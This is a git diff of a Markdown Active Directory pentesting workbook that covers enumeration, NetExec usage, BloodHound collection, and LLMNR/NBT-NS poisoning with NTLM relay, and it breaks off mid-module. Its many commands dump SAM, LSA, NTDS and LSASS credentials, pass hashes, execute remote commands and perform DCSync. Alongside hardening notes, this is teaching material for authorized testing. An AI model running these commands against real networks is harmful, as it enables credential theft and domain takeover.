@@ -1,2972 +1,2441 @@
-
-
-# 🧠 Active Directory Pentesting Workbook
-
----
+# Active Directory Pentesting Workbook
 
 ## Table of Contents
 
-1. [Module 1: Introduction to Active Directory](#module-1)
-2. [Module 2: Initial Enumeration & Reconnaissance](#module-2)
-3. [Module 3: LLMNR/NBT-NS Poisoning (Linux & Windows)](#module-3)
-4. [Module 4: Enumerating Users, Groups & Privileged](#module-4)
-5. [Module 5: Reviewing Domain Password Policies & Attack Opportunities](#module-5)
-6. [Module 6: Identifying Built-In Groups & Default Security Settings](#module-6)
-7. [Module 7: Credentialed Enumeration (Linux & Windows)](#module-7)
-8. [Module 8: Enumerating Security Controls (GPOs, ACLs, AD CS, AEP)](#module-8)
-9. [Module 9: Password Spraying (Building Target Lists; Linux & Windows)](#module-9)
-10. [Module 10: Enumerating Computers, SPN Delegation & Trust Relationships](#module-10)
-11. [Module 11: Kerberos Attacks](#module-11)
-12. [Module 12: ACL & DCSync Abuse](#module-5)
-13. [Module 13: Domain Trust & Forest Attacks](#module-6)
-14. [Module 14: AD Certificate Services Enumeration & Abuses](#module-7)
-15. [Module 15: Miscellaneous Misconfigurations](#module-8)
-16. [Module 16: Lateral Movement & Privilege Escalation](#module-9)
-17. [Module 17: Persistence & Cleanup](#module-10)
----
+1. [Module 1: Introduction to Active Directory](#module-1-introduction-to-active-directory)
+2. [Module 2: Initial Enumeration & Reconnaissance](#module-2-initial-enumeration--reconnaissance)
+3. [Module 3: LLMNR/NBT-NS Poisoning & NTLM Coercion](#module-3-llmnrnbt-ns-poisoning--ntlm-coercion)
+4. [Module 4: Enumerating Users, Groups & Privileged Accounts](#module-4-enumerating-users-groups--privileged-accounts)
+5. [Module 5: Password Policy & Password Spraying](#module-5-password-policy--password-spraying)
+6. [Module 6: Kerberos Attacks](#module-6-kerberos-attacks)
+7. [Module 7: ACL Abuse & DCSync](#module-7-acl-abuse--dcsync)
+8. [Module 8: AD Certificate Services (ESC1-ESC16)](#module-8-ad-certificate-services-esc1-esc16)
+9. [Module 9: Delegation Attacks & RBCD](#module-9-delegation-attacks--rbcd)
+10. [Module 10: Shadow Credentials & Coercion Chains](#module-10-shadow-credentials--coercion-chains)
+11. [Module 11: Domain Trust & Forest Attacks](#module-11-domain-trust--forest-attacks)
+12. [Module 12: Lateral Movement & Privilege Escalation](#module-12-lateral-movement--privilege-escalation)
+13. [Module 13: Persistence & Cleanup](#module-13-persistence--cleanup)
+14. [Module 14: Miscellaneous Misconfigurations](#module-14-miscellaneous-misconfigurations)
+15. [Module 15: Testing Checklist](#module-15-testing-checklist)
+16. [References & Resources](#references--resources)
 
-## <a name="module-1"></a> Module 1: Introduction to Active Directory
+## Module 1: Introduction to Active Directory
 
-*(If you’re already familiar with AD basics—domains, forests, DCs, LDAP, Kerberos, DNs, CNs, DCs—feel free to skip to Module 2.)*
+*Skip to Module 2 if you already know AD basics: domains, forests, DCs, LDAP, Kerberos, DNs.*
 
-### Introduction  
-Active Directory (AD) is Microsoft’s directory service—a centralized database and collection of services that manage users, computers, and resources in a Windows network. If a company is the “kingdom,” then Active Directory is the “grand library” containing everything about citizens (users), “castles” (servers), “royal decrees” (policies), and “keystones” (credentials). For pentesters, understanding AD is critical because most enterprise-level Windows environments rely on it entirely.
+### What is Active Directory?
 
-### Definitions  
-1. **Directory Service**  
-   - A system that stores information about objects (users, computers, printers, etc.) in a network and allows querying and management of that information.  
+Active Directory (AD) is Microsoft's directory service — a centralized database managing users, computers, and resources in a Windows network. Over 90% of large organizations rely on AD for authentication and authorization. For pentesters, nearly every internal engagement pivots through AD.
 
-2. **Domain**  
-   - A logical grouping of objects that share a common AD database and security policies.  
+### Core Definitions
 
-3. **Domain Controller (DC)**  
-   - A server that holds a writable copy of the AD database and responds to authentication requests.  
+**Directory Service** — Stores and manages information about network objects (users, computers, printers).
 
-4. **Forest**  
-   - A collection of one or more domains that share a common schema and global catalog.  
+**Domain** — A logical grouping of objects sharing a common AD database and security policies.
 
-5. **Organizational Unit (OU)**  
-   - A container within a domain used to organize objects hierarchically.  
+**Domain Controller (DC)** — Server holding a writable copy of the AD database; handles authentication requests.
 
-6. **Lightweight Directory Access Protocol (LDAP)**  
-   - A protocol to query and modify directory services like AD.  
+**Forest** — One or more domains sharing a common schema and global catalog. The forest is the security boundary.
 
-7. **Global Catalog (GC)**  
-   - A DC that holds a partial replica of all objects in the forest for fast searches.  
+**Organizational Unit (OU)** — Container within a domain used to organize objects hierarchically.
 
-8. **Kerberos**  
-   - The primary authentication protocol in AD.  
+**LDAP (Lightweight Directory Access Protocol)** — Protocol to query and modify directory services.
 
-9. **Distinguished Name (DN)**  
-   - The unique path of an object in AD. Format:  
-     ```
-     CN=UserName,OU=OrgUnit,DC=domain,DC=tld
-     ```  
+**Global Catalog (GC)** — A DC holding a partial replica of all objects in the forest for cross-domain searches.
 
-10. **Common Name (CN)**  
-    - The attribute in AD that typically holds a display name.  
-11. **Domain Component (DC)**  
-    - Each segment of the domain name in a DN.  
+**Kerberos** — Primary authentication protocol in AD. Issues time-limited tickets instead of sending passwords.
 
-### Why It Matters  
-- Over 90% of large organizations run Windows and rely on AD for authentication and authorization.  
-- A successful pentest almost always involves pivoting through AD—finding weak passwords, abusing misconfigured groups, and elevating to Domain Admin.  
+**Distinguished Name (DN)** — Unique path of an object: `CN=UserName,OU=OrgUnit,DC=domain,DC=tld`
 
-### Tools & Commands  
+**Common Name (CN)** — Display name attribute of an AD object.
 
-#### Built-In Windows Commands  
-- `dsquery` (legacy):  
-  ```
-  dsquery user -name *
-  dsquery group -name "Domain Admins"
-  ```  
-- `net user`:  
-  ```
-  net user <username> /domain
-  ```  
-- `net group`:  
-  ```
-  net group "Domain Admins" /domain
-  ```  
-- `whoami`:  
-  ```
-  whoami
-  whoami /groups
-  ```
+**Domain Component (DC)** — Each segment of the domain name in a DN.
 
-#### PowerShell (AD Module)  
-- Import AD module:  
-  ```powershell
-  Import-Module ActiveDirectory
-  ```  
-- Get domain information:  
-  ```powershell
-  Get-ADDomain
-  Get-ADForest
-  ```  
-- List AD users:  
-  ```powershell
-  Get-ADUser -Filter * | Select Name
-  ```
+### Essential Commands
 
-#### LDAP Queries (ldapsearch)  
-- Find defaultNamingContext:  
-  ```bash
-  ldapsearch -x -H ldap://<DC_IP> -s base -b "" "(objectClass=*)" defaultNamingContext
-  ```  
-- List all users:  
-  ```bash
-  ldapsearch -x -H ldap://<DC_IP> -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user))" sAMAccountName,distinguishedName
-  ```  
-- List all groups:  
-  ```bash
-  ldapsearch -x -H ldap://<DC_IP> -b "DC=corp,DC=local" "(objectCategory=group)" cn,distinguishedName
-  ```  
+**Verify domain membership:**
 
-### Step-by-Step Guide  
+```
+echo %USERDOMAIN%
+echo %LOGONSERVER%
+whoami /groups
+```
 
-#### 1. Verify Domain-Joined Machine  
-- Check domain:  
-  ```bat
-  echo %USERDOMAIN%
-  ```  
-- Check logon server:  
-  ```bat
-  echo %LOGONSERVER%
-  ```  
-- PowerShell:  
-  ```powershell
-  whoami
-  whoami /groups
-  ```
+**Discover FQDN:**
 
-#### 2. Discover FQDN via DNS  
-- Run nslookup:  
-  ```bat
-  nslookup corp
-  ```  
-- PowerShell:  
-  ```powershell
-  Get-ADDomain | Select-Object DNSRoot, NetBIOSName
-  ```
+```powershell
+Get-ADDomain | Select-Object DNSRoot, NetBIOSName
+nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local
+```
 
-#### 3. Enumerate Domain Controllers  
-- `nltest`:  
-  ```bat
-  nltest /dclist:CORP
-  ```  
-- PowerShell:  
-  ```powershell
-  Get-ADDomainController -Filter * | Select HostName,IPv4Address
-  ```  
-- LDAP:  
-  ```bash
-  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(objectCategory=domainController)" name,distinguishedName
-  ```
+**Enumerate Domain Controllers:**
 
-#### 4. Verify Reachability  
-- Ping:  
-  ```bat
-  ping DC01.corp.local
-  ```  
-- SMB share:  
-  ```bat
-  net view \\DC01.corp.local
-  ```  
+```powershell
+# PowerShell
+Get-ADDomainController -Filter * | Select HostName, IPv4Address
 
-#### 5. Retrieve Default Naming Context  
-- RootDSE query:  
-  ```bash
-  ldapsearch -x -H ldap://DC01.corp.local -s base -b "" "(objectClass=*)" defaultNamingContext
-  ```
+# nltest
+nltest /dclist:CORP
 
-### Common Pitfalls  
-- Confusing NetBIOS vs. FQDN  
-- Wrong Base DN  
-- SMB blocked by firewall  
-- Assuming only one DC  
+# LDAP
+ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192)" name
+```
 
-### Next Steps  
-- **Module 2**: Enumerating Users, Groups & Privileged Accounts  
-- **Module 3**: Reviewing Domain Password Policies & Attack Opportunities  
-- **Module 4**: Built-In Groups & Default Security Settings  
+**RootDSE query (find base DN):**
 
-- - - 
+```
+ldapsearch -x -H ldap://DC01.corp.local -s base -b "" "(objectClass=*)" defaultNamingContext
+```
 
-## <a name="module-2"></a> Module 2: Initial Enumeration & Reconnaissance
+## Module 2: Initial Enumeration & Reconnaissance
 
-_Learn how to gather intel—both anonymously and with low-privilege credentials._
+*Gather intel anonymously and with low-privilege credentials.*
 
 ### Key Concepts
 
--   **Anonymous Bind**  
-    A way to connect to LDAP without providing a username or password—like browsing a public bookshelf. You can see basic containers (Schema, Configuration, Domain) but no sensitive details.
-    
--   **Low-Privilege Account**  
-    A regular user account with minimal rights, like a guest pass. You can query most directory information without modifying anything.
-    
--   **Reconnaissance**  
-    The process of quietly mapping out the AD environment: discovering domains, OUs, and naming contexts before attempting any deeper attacks.
+**Anonymous Bind** — Connecting to LDAP without credentials. Returns basic containers (Schema, Configuration, Domain) but no sensitive details. Many modern DCs disable this.
 
-#### Container Names Explained
+**Low-Privilege Account** — A regular domain user. By default, domain users can read most directory objects — this is by design and gives pentesters extensive enumeration capability.
 
-After an anonymous bind, you’ll often see three top-level containers:
+### Top-Level Containers
 
-1.  **Schema**
-    
-    -   Think of Schema as the blueprint or dictionary for Active Directory. It defines every object type (user, computer, group) and attribute (name, email, password policy) that AD supports.
-        
-2.  **Configuration**
-    
-    -   Configuration is like the master settings file for your entire AD forest. It contains data on sites, services, and replication topology—how DCs talk to each other.
-        
-3.  **Domain (e.g., lab.local)**
-    
-    -   This is the container holding all actual user, computer, and group objects for your domain. The name (lab.local) is your domain’s DNS name and forms the base Distinguished Name (DN) for domain queries.
-        
+After binding, you see three containers:
 
-### Tools & Commands
+**Schema** — Blueprint defining every object type and attribute AD supports.
 
--   **ldapsearch** – Query AD anonymously or as a low-privilege user
-    
-    ```bash
-    # Anonymous bind
-    ldapsearch -x -H ldap://dc1.lab.local -b "DC=lab,DC=local"
-    # Authenticated bind
-    ldapsearch -x -H ldap://dc1.lab.local -D "LAB\User1" -w Pass123 -b "DC=lab,DC=local"
-    
-    ```
-    
--   **whoami** – Check current user and group memberships on Windows
-    
-    ```bat
-    whoami /groups
-    
-    ```
+**Configuration** — Forest-wide settings: sites, services, replication topology, AD CS enrollment services.
 
-### Step-by-Step Guide
+**Domain (e.g., corp.local)** — All actual user, computer, and group objects.
 
-1.  **Anonymous LDAP query**
-    
-    ```bash
-    ldapsearch -x -H ldap://dc1.lab.local -b "DC=lab,DC=local"
-    
-    ```
-    
-    _Look for container names:_
-    
-    ```text
-    Schema
-    Configuration
-    lab.local
-    
-    ```
-    
-2.  **Authenticated LDAP query**
-    
-    ```bash
-    ldapsearch -x -H ldap://dc1.lab.local -D "LAB\User1" -w Pass123 -b "DC=lab,DC=local"
-    
-    ```
-    
-    _Notice additional attributes like email, descriptions._
-    
-3.  **Determine naming contexts**
-    
-    ```bash
-    ldapsearch -x -H ldap://dc1.lab.local -s base -b "" "(objectClass=*)" defaultNamingContext
-    
-    ```
-    
-    _Records default domain DN (e.g., `DC=lab,DC=local`)._
-   
+### Enumeration Commands
 
+**Anonymous LDAP bind:**
 
-### Mitigation & Hardening
+```
+ldapsearch -x -H ldap://dc1.corp.local -b "DC=corp,DC=local"
+```
 
--   Disable anonymous LDAP binds via Group Policy: **Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options → Domain controller: LDAP server signing requirements** → Require signing.
-    
--   Audit and restrict low-privilege account directory read permissions.
- 
+**Authenticated LDAP bind:**
 
-- - - 
-## <a name="module-3"></a> Module 3: LLMNR/NBT-NS Poisoning (Linux & Windows)
+```
+ldapsearch -x -H ldap://dc1.corp.local -D "CORP\User1" -w 'Pass123' -b "DC=corp,DC=local"
+```
 
-_Capture NTLMv2 hashes by spoofing local name-resolution queries._
+Example output — authenticated queries return additional attributes like `mail`, `description`, `title`, `manager` that anonymous binds hide.
+
+**Naming contexts:**
+
+```
+ldapsearch -x -H ldap://dc1.corp.local -s base -b "" "(objectClass=*)" defaultNamingContext namingContexts
+```
+
+**Credentialed enumeration with PowerShell:**
+
+```powershell
+Import-Module ActiveDirectory
+Get-ADDomain
+Get-ADForest
+Get-ADUser -Filter * -Properties sAMAccountName, mail, title, manager | Select sAMAccountName, mail, title
+```
+
+**Computer enumeration:**
+
+```powershell
+Get-ADComputer -Filter * -Properties OperatingSystem | Select Name, OperatingSystem
+```
+
+Example output:
+
+```
+Name        OperatingSystem
+----        -----
+DC01        Windows Server 2022 Datacenter
+WS001       Windows 11 Pro
+SRV-SQL01   Windows Server 2019 Standard
+```
+
+### NetExec (nxc) — The Swiss Army Knife
+
+NetExec (successor to CrackMapExec) handles nearly every phase of AD pentesting: recon, spraying, roasting, dumping, and lateral movement — all from one tool. Learn it well.
+
+**Initial recon (unauthenticated):**
+
+```
+# Discover SMB hosts and domain info
+nxc smb 10.0.0.0/24
+
+# Null session enumeration
+nxc smb dc1.corp.local -u '' -p '' --users
+nxc smb dc1.corp.local -u '' -p '' --shares
+nxc smb dc1.corp.local -u '' -p '' --pass-pol
+
+# RID brute force (find users even when null sessions are restricted)
+nxc smb dc1.corp.local -u '' -p '' --rid-brute 10000
+```
+
+**Authenticated enumeration (low-priv domain user):**
+
+```
+# Users, groups, shares, sessions, password policy — all at once
+nxc smb dc1.corp.local -u user1 -p 'Pass123' --users --groups --shares --sessions --pass-pol --loggedon-users
+
+# Enumerate admin count, descriptions, delegations
+nxc ldap dc1.corp.local -u user1 -p 'Pass123' --admin-count
+nxc ldap dc1.corp.local -u user1 -p 'Pass123' -M user-desc
+nxc ldap dc1.corp.local -u user1 -p 'Pass123' --find-delegation
+
+# Enumerate AD CS
+nxc ldap dc1.corp.local -u user1 -p 'Pass123' -M adcs
+
+# Check MachineAccountQuota
+nxc ldap dc1.corp.local -u user1 -p 'Pass123' -M maq
+
+# Check LDAP signing / channel binding
+nxc ldap dc1.corp.local -u user1 -p 'Pass123' -M ldap-checker
+
+# Check for pre-2K computer accounts (default password = lowercase hostname)
+nxc ldap dc1.corp.local -u user1 -p 'Pass123' -M pre2k
+
+# Check WebDAV (WebClient service — needed for HTTP coercion)
+nxc smb 10.0.0.0/24 -u user1 -p 'Pass123' -M webdav
+
+# Check for vulnerabilities
+nxc smb dc1.corp.local -u user1 -p 'Pass123' -M zerologon
+nxc smb dc1.corp.local -u user1 -p 'Pass123' -M petitpotam
+nxc smb dc1.corp.local -u user1 -p 'Pass123' -M nopac
+
+# ACL enumeration (read DACLs)
+nxc ldap dc1.corp.local -u user1 -p 'Pass123' -M daclread -o TARGET=administrator PRINCIPAL=user1 ACTION=read
+
+# Spider shares for sensitive files
+nxc smb dc1.corp.local -u user1 -p 'Pass123' -M spider_plus
+
+# Identify SMB signing disabled (for relay targets)
+nxc smb 10.0.0.0/24 --gen-relay-list relay_targets.txt
+
+# BloodHound collection directly from nxc
+nxc ldap dc1.corp.local -u user1 -p 'Pass123' --bloodhound -c All --dns-server 10.0.0.1
+```
+
+**Kerberoasting and AS-REP roasting from nxc:**
+
+```
+nxc ldap dc1.corp.local -u user1 -p 'Pass123' --kerberoasting kerberoast.hash
+nxc ldap dc1.corp.local -u user1 -p 'Pass123' --asreproast asrep.hash
+```
+
+**Credential dumping (requires admin):**
+
+```
+# SAM database (local accounts)
+nxc smb target.corp.local -u admin -p 'P@ss!' --sam
+
+# LSA secrets
+nxc smb target.corp.local -u admin -p 'P@ss!' --lsa
+
+# NTDS.dit (full domain dump — run against DC)
+nxc smb dc1.corp.local -u administrator -p 'P@ss!' --ntds
+
+# LSASS memory via lsassy (stealthier)
+nxc smb target.corp.local -u admin -p 'P@ss!' -M lsassy
+nxc smb target.corp.local -u admin -p 'P@ss!' -M nanodump
+
+# DPAPI secrets (browser passwords, credential manager)
+nxc smb target.corp.local -u admin -p 'P@ss!' --dpapi cookies
+nxc smb target.corp.local -u admin -p 'P@ss!' --dpapi credentials
+
+# LAPS passwords
+nxc ldap dc1.corp.local -u user1 -p 'Pass123' --laps
+
+# GMSA passwords
+nxc ldap dc1.corp.local -u user1 -p 'Pass123' --gmsa
+
+# GPP passwords (legacy cpassword in SYSVOL)
+nxc smb dc1.corp.local -u user1 -p 'Pass123' -M gpp_password
+```
+
+**Lateral movement and execution from nxc:**
+
+```
+# Command execution (multiple methods)
+nxc smb target.corp.local -u admin -p 'P@ss!' -x "whoami"          # CMD
+nxc smb target.corp.local -u admin -p 'P@ss!' -X '$env:username'   # PowerShell
+nxc winrm target.corp.local -u admin -p 'P@ss!' -x "whoami"        # WinRM
+nxc wmi target.corp.local -u admin -p 'P@ss!' -x "whoami"          # WMI
+
+# Pass-the-Hash
+nxc smb target.corp.local -u admin -H aad3b435b51404ee:1122334455aabbcc -x "whoami"
+
+# Kerberos authentication
+nxc smb target.corp.local -u admin -p 'P@ss!' -k
+
+# Delegation abuse (S4U)
+nxc smb dc1.corp.local -u 'svc_web$' -p 'password' --delegate administrator --delegate-spn cifs/dc1.corp.local
+
+# Identify where users are logged in (for targeting)
+nxc smb 10.0.0.0/24 -u admin -p 'P@ss!' --loggedon-users
+```
+
+**nxc with MSSQL protocol:**
+
+```
+# Auth check
+nxc mssql sql-srv.corp.local -u sa -p 'DbP@ss!' --local-auth
+
+# Execute OS commands via xp_cmdshell
+nxc mssql sql-srv.corp.local -u sa -p 'DbP@ss!' --local-auth -x "whoami"
+
+# Execute SQL queries
+nxc mssql sql-srv.corp.local -u sa -p 'DbP@ss!' --local-auth -q "SELECT name FROM master.dbo.sysdatabases"
+```
+
+### enum4linux-ng (SMB/RPC Enumeration)
+
+```
+# Comprehensive enumeration
+enum4linux-ng -A dc1.corp.local
+
+# With credentials
+enum4linux-ng -u user1 -p 'Pass123' -A dc1.corp.local
+```
+
+### BloodHound / SharpHound Collection
+
+BloodHound maps attack paths visually. Use SharpHound (C#) or BloodHound.py (Python) to collect data.
+
+**SharpHound (Windows):**
+
+```
+SharpHound.exe --CollectionMethods All --Domain corp.local
+```
+
+**BloodHound.py (Linux):**
+
+```
+bloodhound-python -u user1 -p 'Pass123' -d corp.local -ns 10.0.0.1 -c All
+```
+
+Load the resulting JSON files into BloodHound CE (Community Edition) and run built-in queries like "Find Shortest Paths to Domain Admins."
+
+### Hardening Notes
+
+- Disable anonymous LDAP binds via GPO: **Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options → Domain controller: LDAP server signing requirements** → Require signing.
+- Restrict directory read permissions for non-essential accounts.
+- Monitor LDAP query volume per account for anomalies.
+
+## Module 3: LLMNR/NBT-NS Poisoning & NTLM Coercion
+
+*Capture NTLMv2 hashes by spoofing name-resolution queries and coercing authentication.*
 
 ### Key Concepts
 
--   **LLMNR (Link-Local Multicast Name Resolution)**  
-    A fallback protocol Windows uses when DNS can’t resolve a name. Computers broadcast queries like “Who is PRINTER1?” on the local network.
-    
--   **NBT-NS (NetBIOS Name Service)**  
-    An older Windows protocol for name resolution over NetBIOS, similar to LLMNR but on the legacy NetBIOS layer.
-    
--   **Poisoning**  
-    Sending fake responses to name-resolution requests, tricking clients into authenticating to the attacker’s machine.
-    
--   **NTLMv2 Hash**  
-    A challenge-response packet from the NT LAN Manager protocol. Capturing this hash allows offline cracking of the user’s password.
-    
--   **SMB Signing**  
-    A security feature requiring cryptographic signing of SMB messages to prevent relay attacks.
-    
--   **DRSUAPI (Directory Replication Service Remote Protocol)**  
-    The interface that Domain Controllers expose for replication. By relaying NTLM auth to LDAP with the DRSUAPI interface, the attacker can pull password hashes (DCSync attack).
-    
--   **DCSync Attack**  
-    An attack where a non-DC node imitates a DC and requests directory replication, extracting the NTDS.dit database including all user hashes.
-    
+**LLMNR (Link-Local Multicast Name Resolution)** — Fallback protocol when DNS fails. Computers broadcast "Who is PRINTER1?" on the local network. Attacker responds with their own IP.
 
+**NBT-NS (NetBIOS Name Service)** — Older fallback name resolution over NetBIOS. Same poisoning concept as LLMNR.
 
+**mDNS (Multicast DNS)** — Another fallback protocol (port 5353). Responder can poison this too.
 
-### Tools & Commands
+**NTLMv2 Hash** — Challenge-response captured during NTLM authentication. Can be cracked offline or relayed.
 
--   **Responder** (Kali Linux) – Poison LLMNR/NBT-NS to capture NTLMv2 hashes
-    
-    ```bash
-    # 1. Edit config to enable only LLMNR/NBNS poisoning
-    vim /etc/responder/Responder.conf
-    #   Under [Responder Core], set:
-    #   HTTP = Off
-    #   SMB = Off
-    #   NBNS = On
-    #   LLMNR = On
-    
-    # 2. Start Responder on interface eth0
-    responder -I eth0 -wr
-    
-    ```
-    
--   **ntlmrelayx.py** (Impacket) – Relay captured hashes to services
-    
-    ```bash
-    # Relay to SMB (share access)
-    ntlmrelayx.py -t smb://dc1.lab.local --smb2support
-    
-    # Relay to LDAP (DCSync)
-    ntlmrelayx.py -t ldap://dc1.lab.local --escalate-method drsuapi
-    
-    ```
-    
--   **hashcat** – Crack NTLMv2 hashes offline
-    
-    ```bash
-    # NTLMv2 mode 5600
-    hashcat -m 5600 captured.hash wordlist.txt
-    
-    ```
-    
+**NTLM Relay** — Forwarding a captured NTLM authentication to another service instead of cracking it. Far more powerful than cracking when SMB signing is disabled.
 
+**SMB Signing** — Cryptographic signing of SMB messages. When disabled (default on workstations), NTLM relay attacks work.
 
+**NTLM Coercion** — Forcing a machine to authenticate to your attacker-controlled server. Multiple techniques exist (see below).
 
-### Step-by-Step Guide
+### 1. LLMNR/NBT-NS Poisoning
 
-1.  **Poison name-resolution**
-    
-    ```bash
-    responder -I eth0 -wr
-    
-    ```
-    
-    _Output:_ Logs in `/usr/share/responder/logs/Responder-Session.log` capturing NTLMv2 hashes.
-    
-2.  **Trigger name lookups on target**
-    
-    ```bat
-    ping NONEXISTENT-SRV
-    
-    ```
-    
-    _Windows sends LLMNR/NBT-NS queries that Responder poisons._
-    
-3.  **Extract captured hashes**
-    
-    ```bash
-    grep "NTLMv2-SSP" /usr/share/responder/logs/Responder-Session.log > captured.hash
-    
-    ```
-    
-    _`captured.hash` now contains challenge-response pairs._
-    
-4.  **Crack hashes**
-    
-    ```bash
-    hashcat -m 5600 captured.hash wordlist.txt
-    
-    ```
-    
-    _Look for recovered plaintext passwords._
-    
-5.  **Relay valid credentials**
-    
-    ```bash
-    ntlmrelayx.py -t ldap://dc1.lab.local --escalate-method drsuapi
-    
-    ```
-    
-    _Explanation:_ ntlmrelayx takes the captured NTLMv2 hash from `captured.hash` and uses it to perform SMB or LDAP authentication to the target (dc1.lab.local). When relaying to LDAP with the DRSUAPI interface, it effectively logs in as the original user (whose hash you captured) without needing the plaintext password. The DC sees an authenticated session and grants replication rights if that user has them, enabling a DCSync.
-    
-    _Details of credential usage:_
-    
-    -   The relay tool uses the NTLMv2 hash as proof of knowledge of the password, performing the NTLM protocol handshake with the DC.
-        
-    -   No plaintext password is required; the hash itself is sufficient for authentication.
-        
-    
-    _Look for:_
-    
-    ```text
-    [+] Accepting connection from 10.0.0.5, relaying to ldap://dc1.lab.local
-    [+] Authenticating as UserA using NTLMv2 hash
-    [+] DRSUAPI may be used to replicate directory
-    [+] Dumping credentials for domain: lab.local
-    
-    ```
-    
+**Responder (Linux):**
 
+```
+# Start Responder on your interface
+responder -I eth0 -wPv
 
-
-### Expected Result
-
--   A file `captured.hash` containing NTLMv2 hashes.
-    
--   **Hashcat** outputs plaintext credentials, e.g., `UserA:Password123`.
-    
--   **ntlmrelayx.py** shows messages like:
-    
-    ```text
-    [+] DRSUAPI may be used to replicate directory
-    [+] Dumping credentials for domain: lab.local
-    
-    ```
-    
--   **secretsdump.py** execution dumps NTDS.dit hashes, for example:
-    
-    ```bash
-    secretsdump.py -just-dc lab.local/attacker@dc1.lab.local
-    
-    ```
-    
-    ```text
-    Administrator:500:aad3b435b51404eeaad3b435b51404ee:1122334455...
-    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5566778899...
-    
-    ```
-    
-
-
-
-### Mitigation & Hardening
-
--   **Disable LLMNR/NBT-NS** via GPO:  
-    Computer Configuration → Policies → Administrative Templates → Network → DNS Client → **Turn off multicast name resolution** → Enabled
-    
--   **Enable SMB Signing** on servers:
-    
-    ```powershell
-    Set-SmbServerConfiguration -RequireSecuritySignature $true
-    
-    ```
-    
-
-
-
-### Next Steps
-
--   **Attack Type:** Credential Capture → NTLM Relay → Privilege Escalation
-    
--   **Attack Path:**
-    
-    1.  Crack captured NTLMv2 hashes.
-        
-    2.  Validate credentials via SMB (e.g., `smbclient`) or WinRM (`evil-winrm`).
-        
-    3.  Perform DCSync via LDAP relay.
-        
-    4.  Dump NTDS.dit hashes and forge Golden Tickets for persistence.
-        
-- - -
-
-## <a name="module-4"></a> Module 4: Enumerating Users, Groups & Privileged Accounts
-
-### Introduction  
-Learn to list all users, identify privileged users (`adminCount=1`), find AS-REP roastable, service accounts, disabled users, and enumerate groups.
-
-### Definitions  
-1. **sAMAccountName**: Pre-Windows 2000 username.  
-2. **userAccountControl**: Bitmask controlling account properties (enabled, disabled, preauth, etc.).  
-3. **adminCount**: Indicates protected accounts in privileged groups.  
-4. **Service Principal Name (SPN)**: Identifier for a service instance.  
-5. **AS-REP Roasting**: Attacking accounts with `DONT_REQUIRE_PREAUTH`.  
-6. **Disabled Account**: `ACCOUNTDISABLE` flag in `userAccountControl`.  
-7. **Fine-Grained Password Policy (FGPP)**: PSOs for specific users/groups.  
-8. **Global / Domain Local / Universal Groups**: Scope of groups.  
-9. **groupType**: Bitmask indicating group scope and security.  
-
-### Why It Matters  
-- Privileged users lead to early domain compromise.  
-- Service accounts can be Kerberoasted.  
-- AS-REP roastable accounts can be cracked offline.  
-
-### Tools & Commands  
-
-#### LDAP Queries  
-- All users:  
-  ```bash
-  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user))" sAMAccountName,userAccountControl,adminCount,distinguishedName
-  ```  
-- Privileged users:  
-  ```bash
-  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(adminCount=1))" sAMAccountName,memberOf,adminCount
-  ```  
-- AS-REP roastable:  
-  ```bash
-  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName,userAccountControl
-  ```  
-- Service accounts (SPNs):  
-  ```bash
-  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))" sAMAccountName,servicePrincipalName
-  ```  
-- Disabled users:  
-  ```bash
-  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" sAMAccountName,userAccountControl,memberOf,whenChanged
-  ```  
-- All groups:  
-  ```bash
-  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(objectCategory=group)" cn,distinguishedName,groupType
-  ```  
-- Members of “Domain Admins”:  
-  ```bash
-  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=group)(cn=Domain Admins))" member
-  ```  
-- Recursive group membership:  
-  ```bash
-  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=group)(member:1.2.840.113556.1.4.1941:=CN=jdoe,CN=Users,DC=corp,DC=local))" cn,distinguishedName
-  ```  
-
-#### PowerShell  
-- List all users:  
-  ```powershell
-  Get-ADUser -Filter * -Properties sAMAccountName,memberOf
-  ```  
-- List all groups:  
-  ```powershell
-  Get-ADGroup -Filter * | Select Name
-  ```  
-- Get privileged users:  
-  ```powershell
-  Get-ADUser -Filter {adminCount -eq 1} -Properties memberOf
-  ```  
-- Get SPN accounts:  
-  ```powershell
-  Get-ADUser -Filter {servicePrincipalName -like "*"} -Properties servicePrincipalName
-  ```  
-- Get disabled users:  
-  ```powershell
-  Get-ADUser -Filter {Enabled -eq $false} -Properties memberOf,whenChanged
-  ```  
-
-### Decoding userAccountControl  
-| Flag Name                         | Value | Purpose                         |
-|-----|-------|---|
-| NORMAL_ACCOUNT (512)              | 512   | Normal, enabled user            |
-| ACCOUNTDISABLE (2)                | 2     | Account is disabled             |
-| DONT_EXPIRE_PASSWORD (65536)      | 65536 | Password never expires          |
-| DONT_REQUIRE_PREAUTH (4194304)    | 4194304 | AS-REP Roastable              |
-
-### Step-by-Step Guide  
-
-#### 1. Enumerate All Users  
-
-```bash
-ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user))" sAMAccountName,userAccountControl,adminCount,distinguishedName
+# Logs saved to: /usr/share/responder/logs/
 ```
 
-**Expected Output (partial)**:  
-```
-dn: CN=Administrator,CN=Users,DC=corp,DC=local
-sAMAccountName: Administrator
-userAccountControl: 512
